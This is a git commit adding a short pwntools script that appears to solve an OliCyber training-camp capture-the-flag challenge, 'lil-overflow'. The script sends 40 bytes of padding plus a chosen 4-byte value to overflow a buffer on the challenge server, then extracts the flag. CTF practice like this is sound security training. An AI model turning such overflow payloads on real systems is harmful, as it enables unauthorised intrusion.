617a656a22de169e06b99198a042fe09193b4313
Federico Bosio <federicobosio0209@gmail.com>
2025-07-30 11:01:55 +0200

    new solve

---
+++ Training camp 3 2023/liloverflow.py
@@ -0,0 +1,14 @@
+from pwn import *
+import re
+
+r = remote('lil-overflow.challs.olicyber.it', 34002)
+r.recvuntil(b"name?")
+
+payload = b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xb0\x1b\xab\x05'
+
+j = r.sendline(payload) 
+j = r.recvall()
+match = re.search(rb"flag\{[^\}]+\}", j, re.IGNORECASE)
+if match:
+    print("[!] FLAG TROVATA:")
+    print(match.group(0).decode())
